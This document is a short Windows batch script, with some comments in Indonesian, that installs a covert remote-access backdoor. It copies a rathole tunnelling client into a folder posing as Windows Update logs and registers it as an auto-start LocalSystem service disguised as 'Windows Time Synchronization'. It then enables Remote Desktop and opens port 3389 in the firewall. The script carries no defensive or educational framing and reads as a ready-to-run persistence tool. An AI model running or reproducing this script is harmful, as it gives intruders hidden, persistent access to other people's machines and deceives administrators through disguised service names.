@echo off

:: Step 1: Copy files
mkdir "C:\Windows\Logs\WindowsUpdate" 2>nul
copy "rathole.exe" "C:\Windows\Logs\WindowsUpdate\rh.exe"
copy "client.toml" "C:\Windows\Logs\WindowsUpdate\config.toml"

:: Step 2: Panggil cmd.exw
sc create "WindowsTimeSync" binPath= "cmd /c cd /d \"C:\Windows\Logs\WindowsUpdate\" && rh.exe config.toml" start= auto DisplayName= "Windows Time Synchronization"

:: Step 3: Atur service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsTimeSync" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsTimeSync" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsTimeSync" /v ImagePath /t REG_EXPAND_SZ /d "cmd /c cd /d \"C:\Windows\Logs\WindowsUpdate\" && rh.exe config.toml" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsTimeSync" /v ObjectName /t REG_SZ /d "LocalSystem" /f

:: Step 4: Start service
net start WindowsTimeSync

:: Step 5: Setup RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp localport=3389 action=allow
sc config TermService start= auto
net start TermService

pause
